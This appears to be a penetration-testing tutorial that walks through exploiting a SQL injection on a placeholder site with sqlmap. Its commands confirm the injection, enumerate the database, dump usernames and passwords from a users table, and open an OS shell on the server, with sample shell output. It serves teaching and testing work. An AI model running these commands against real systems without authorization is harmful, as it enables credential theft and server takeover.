# Walkthrough: SQL Injection with sqlmap

This document provides a step-by-step guide on how to identify and exploit a basic SQL Injection vulnerability using `sqlmap`.

**Target**: A web application with a vulnerable parameter (e.g., in a login form or URL).
**Objective**: To enumerate the database and gain an operating system shell on the target server.

-----

### Phase 1: Discovery and Confirmation

First, we need to identify a part of the web application that might be vulnerable. This is often a parameter in a URL that fetches data from the database.

1.  **Identify a Potential Target**
    Let's assume we have found a URL like this:
    `http://vulnerable-site.com/products.php?id=1`

2.  **Manual Check (Optional but Recommended)**
    You can perform a quick manual check by adding a single quote (`'`) to the parameter and observing the application's response.
    `http://vulnerable-site.com/products.php?id=1'`

    If the page returns a database error message, it's a strong indicator of an SQL Injection vulnerability.

3.  **Confirm with `sqlmap`**
    Now, we use `sqlmap` to automatically test and confirm the vulnerability. The `--batch` flag tells `sqlmap` to use default answers for all questions.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch
    ```

    If `sqlmap` confirms that the parameter is injectable, you can proceed.

### Phase 2: Database Enumeration

Once the vulnerability is confirmed, we can use `sqlmap` to map out the entire database structure.

1.  **List Databases**
    Use the `--dbs` flag to list all available databases.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --dbs --batch
    ```

    `sqlmap` might return databases like `information_schema`, `webapp_db`, etc.

2.  **List Tables from a Specific Database**
    Let's say we are interested in the `webapp_db`. We use the `-D` flag to specify the database and `--tables` to list its tables.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" -D webapp_db --tables --batch
    ```

    This might reveal tables like `users`, `products`, `orders`.

3.  **List Columns from a Table**
    Now, let's inspect the `users` table. We use the `-T` flag for the table name and `--columns` to see its columns.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" -D webapp_db -T users --columns --batch
    ```

    This could show columns like `id`, `username`, `password`.

4.  **Dump Data from Columns**
    Finally, let's dump the contents of the `username` and `password` columns.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" -D webapp_db -T users -C "username,password" --dump --batch
    ```

    `sqlmap` will display the extracted user credentials.

### Phase 3: Gaining an OS Shell

If the database user has sufficient privileges (`FILE` privileges) and `sqlmap` can find a writable directory in the web root, it's possible to get a command shell.

1.  **Attempt to Get a Shell**
    The `--os-shell` command automates this process. `sqlmap` will ask for the language of the web application (e.g., PHP, ASP) and attempt to upload a small shell payload.

    ```bash
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --os-shell
    ```

2.  **Interact with the Shell**
    If successful, `sqlmap` will provide you with a prompt. You can now execute operating system commands on the target server.

    ```
    os-shell> id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

    os-shell> ls -la /var/www/html
    ... (directory listing) ...
    ```

**Walkthrough complete.**
